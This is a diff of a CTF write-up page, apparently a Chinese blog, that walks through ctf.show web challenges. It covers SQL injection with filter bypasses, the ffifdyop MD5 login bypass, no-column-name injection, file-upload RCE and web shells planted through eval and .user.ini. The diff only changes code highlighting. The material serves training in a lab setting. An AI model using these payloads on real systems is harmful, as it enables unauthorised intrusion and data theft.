 <p>这里可以看到是注入成功了的</p>
 <p>我们再试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1/**/or/**/1=1#</span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205160944283.png" alt="image-20241205160944283"></p>
 <p>可以正常回显</p>
 <p>判断字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;/**/order/**/by/**/4#字段数是3</span><br></pre></td></tr></table></figure>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span><span class="comment">/**/</span>order<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span><span class="meta">#字段数是3</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205134800958.png" alt="image-20241205134800958"></p>
 <p>判断回显位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205161104960.png" alt="image-20241205161104960"></p>
 <p>可以看到2和3都有回显，那我们用2进行注入</p>
 <p>空格用&#x2F;**&#x2F;进行绕过，单引号用双引号就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆破数据库</span><br><span class="line">?id=1/**/union/**/select/**/1,database(),3#数据库名为web7</span><br><span class="line">爆破数据库表名</span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=“web7”),3#出现flag,page,user三个表</span><br><span class="line">(其实这里的话我一开始不知道是过滤了单引号，我原来的语句是?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=‘web7’),3#然后发现并没有回显，所以才发现是过滤了单引号)</span><br><span class="line">爆破表中字段</span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#出现flag字段</span><br><span class="line">爆破数据</span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/flag/**/from/**/web7.flag),3#</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆破数据库</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>#数据库名为web7</span><br><span class="line">爆破数据库表名</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=“web7”),<span class="number">3</span>#出现flag,page,<span class="keyword">user</span>三个表</span><br><span class="line">(其实这里的话我一开始不知道是过滤了单引号，我原来的语句是?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=‘web7’),<span class="number">3</span>#然后发现并没有回显，所以才发现是过滤了单引号)</span><br><span class="line">爆破表中字段</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">column_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">columns</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="built_in">table_name</span>=&quot;flag&quot;),<span class="number">3</span>#出现flag字段</span><br><span class="line">爆破数据</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>web7.flag),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
 
 <h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><h3 id="布尔盲注-过滤逗号"><a href="#布尔盲注-过滤逗号" class="headerlink" title="#布尔盲注+过滤逗号"></a>#布尔盲注+过滤逗号</h3><p>做到这一题，基本可以写简单的注入工具了</p>
 <p>还是一样的页面，我们先fuzz一下</p>
 <p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308204915981.png" alt="image-20250308204915981"></p>
 <p>union等字符被过滤了，尝试盲注</p>
 <p>因为这里的逗号被过滤了，所以我们的盲注语句要稍微改一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是原来的语句</span><br><span class="line">-1 or ascii(substr((select database()),1,1))=&#x27;xx&#x27;%23</span><br><span class="line">修改后</span><br><span class="line">-1 or ascii(substr((select database())from 1 for 1))=&#x27;xx&#x27;%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是原来的语句</span><br><span class="line"><span class="number">-1</span> <span class="keyword">or</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="string">&#x27;xx&#x27;</span>%<span class="number">23</span></span><br><span class="line">修改后</span><br><span class="line"><span class="number">-1</span> <span class="keyword">or</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>())<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))=<span class="string">&#x27;xx&#x27;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><h4 id="from-for"><a href="#from-for" class="headerlink" title="from for"></a>from for</h4><p>盲注的时候为了截取字符串，我们往往会使用substr(),mid()。这些子句方法都需要使用到逗号，对于substr()和mid()这两个方法可以使用from for的方式来解决：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
@@ -403,7 +547,7 @@
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205180453136.png" alt="image-20241205180453136"></p>
 <p>可以看到这里有or语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop 的MD5加密结果是 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">经过MySQL编码后会变成&#x27;or&#x27;6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop 的MD5加密结果是 <span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">经过MySQL编码后会变成<span class="string">&#x27;or&#x27;</span><span class="number">6</span>xxx,使<span class="keyword">SQL</span>恒成立,相当于万能密码,可以绕过md5()函数的加密</span><br></pre></td></tr></table></figure>
 
 <p>就可以构造出必真的结果。</p>
 <p>因为这里限制了长度，所以我们用ffifdyop</p>
@@ -423,7 +567,7 @@
 <p>思路:</p>
 <p>我们发现很多关键字<code> $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</code>都被过滤掉了，那么常规注入就不可行了，而且账户密码都进行了过滤，代码里面输出flag的要求是我们输入的password和数据库中的password是一样的，但是我们啥也不知道，那么怎么办呢？</p>
 <h3 id="构建虚拟表with-rollup绕过"><a href="#构建虚拟表with-rollup绕过" class="headerlink" title="构建虚拟表with rollup绕过"></a>构建虚拟表with rollup绕过</h3><p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#</span><br><span class="line">password:</span><br></pre></td></tr></table></figure>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span>group<span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup<span class="comment">#</span></span><br><span class="line">password:</span><br></pre></td></tr></table></figure>
 
 <p>with rollup:  mysql中的with rollup是用来在分组统计数据的基础上再进行统计汇总，用来得到group by的汇总信息。要配合 group by 一块儿使用，”group by password with rollup”,简单说一下，就是使用with rollup 查询以后，查询结果集合里面会多一条NULL 记录，这一题利用NULL 和空字符相等，而后获得flag。我们就是要通过with rollup使sql语句查询结果为null，然后不输入pwd使pwd为null就可以使$password&#x3D;&#x3D;$row[‘password’],通过验证输出我们的flag</p>
 <h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><h3 id="session伪造"><a href="#session伪造" class="headerlink" title="#session伪造"></a>#session伪造</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241212184937818.png" alt="image-20241212184937818"></p>
@@ -443,7 +587,7 @@
 <p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308214036299.png" alt="image-20250308214036299"></p>
 <p>然后访问1.txt看到显示123，说明可以写，并且目录就是当前目录</p>
 <p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(%271.php%27,%27&lt;?php eval($_POST[1]);?&gt;%27);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">file_put_contents(%271.php%27,%27</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">%27);</span></span><br></pre></td></tr></table></figure>
 
 <p>访问1.php并用蚁剑去连马，绕过disable_functions就可以了</p>
 <p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308214729871.png" alt="image-20250308214729871"></p>
@@ -455,11 +599,11 @@
 
 <p>很简单，就是无数字字母里的临时文件上传rce</p>
 <p>请求包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/???/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show</span><br><span class="line">Content-Length: 296</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line">whoami</span><br><span class="line">------WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundaryiKHEKB03McUcMv6w--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>296</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">#! /bin/sh</span></span><br><span class="line"><span class="language-pgsql">whoami</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
 
 <p>这里如果是全部问号的话感觉匹配不上我们上传的文件，刚好漏了个字母p，应该就是这里用的</p>
 <p>接着改文件内容进行rce就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/???/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show</span><br><span class="line">Content-Length: 303</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line">cat /flag.txt</span><br><span class="line">------WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundaryiKHEKB03McUcMv6w--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>303</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">#! /bin/sh</span></span><br><span class="line"><span class="language-pgsql">cat /flag.txt</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
 
 <h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><h3 id="user-ini文件上传"><a href="#user-ini文件上传" class="headerlink" title="#.user.ini文件上传"></a>#.user.ini文件上传</h3><p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308221344911.png" alt="image-20250308221344911"></p>
 <p>传了一个一句话木马显示大小错误，扫目录看到一个&#x2F;upload.php</p>
@@ -482,7 +626,7 @@
 <p>我们要上传一个.user.ini文件，.user.ini 是 PHP 的用户级配置文件。这个文件允许用户在特定目录中自定义一些 PHP 配置选项，以覆盖全局 PHP 配置。</p>
 <p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。</p>
 <p>我们在.user.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.user.ini的内容</span><br><span class="line">auto_prepend_file=a.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.user.ini的内容</span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.txt</span><br></pre></td></tr></table></figure>
 
 <p>然后编辑a.txt写一句话木马就行，这里要记得文件的内容大小问题</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
@@ -512,13 +656,13 @@
 <p>传入<code>1/**/or/**/true</code>回显admin弹窗，用<code>/**/</code>可以绕过空格</p>
 <p>所以这里的话应该是要打无列名注入</p>
 <p>先测一下字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1/**/order/**/by/**/1---------传入2报错，字段数为1</span><br><span class="line">-1/**/union/**/select/**/1---------回显1(注意这里要填-1才会返回1的结果，不然返回位置会被1的查询结果占据)</span><br><span class="line">-1/**/union/**/select/**/database()-----回显web,当前数据库为web</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web&#x27;)---------回显content表名，这里使用了innodb_table_stats获取表名</span><br><span class="line">利用union别名查询每列的数据</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(`1`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a) ------1,1,2,3</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(`2`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a) ------2,admin,gtf1y,Wow</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(`3`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a)---3,flag is not here!,wow,you can really dance,tell you a secret,secret has a secret...</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">---------传入2报错，字段数为1</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">---------回显1(注意这里要填-1才会返回1的结果，不然返回位置会被1的查询结果占据)</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">database</span>()<span class="comment">-----回显web,当前数据库为web</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>)<span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name=<span class="string">&#x27;web&#x27;</span>)<span class="comment">---------回显content表名，这里使用了innodb_table_stats获取表名</span></span><br><span class="line">利用<span class="keyword">union</span>别名查询每列的数据</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(`<span class="number">1</span>`)<span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)<span class="keyword">as</span><span class="comment">/**/</span>a) 